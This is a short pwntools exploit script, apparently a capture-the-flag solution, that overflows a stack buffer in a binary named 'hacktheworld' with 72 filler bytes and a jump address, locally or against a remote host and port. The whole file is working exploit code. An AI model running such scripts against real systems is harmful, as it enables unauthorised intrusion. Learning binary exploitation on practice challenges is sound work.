from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


offset = b'A'*72

func = p32(0x0000000000400657)

exe = "./hacktheworld"
elf = context.binary = ELF(exe, checksec=False)
io = start()

payload = offset + func

io.recvuntil('? ')
io.sendline(payload)

io.interactive()
